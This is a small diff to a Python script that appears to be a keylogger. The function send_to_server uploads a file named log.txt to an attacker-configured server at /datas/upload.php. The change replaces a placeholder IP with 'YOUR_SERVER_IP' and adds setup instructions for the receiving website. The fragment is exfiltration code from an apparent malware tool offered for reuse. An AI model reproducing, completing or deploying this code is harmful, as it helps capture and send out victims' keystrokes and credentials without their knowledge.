@@ -11,8 +11,8 @@ def releasing(key):
     
 def send_to_server():
 
-    url = "http://192.168.X.X/datas/upload.php" # NOTE: You only need to change the 'url' variable to match your server's IP address.
-                                                # Everything else in the code remains the same.(keep the path /datas/upload.php)
+    url = "http://YOUR_SERVER_IP/datas/upload.php" # NOTE: You only need to change the 'url' variable to match your server's IP address.
+                                                # Everything else in the code remains the same.(keep the path /datas/upload.php if using datas.zip as website)
 
     files = {'file': open("log.txt", "rb")}
 
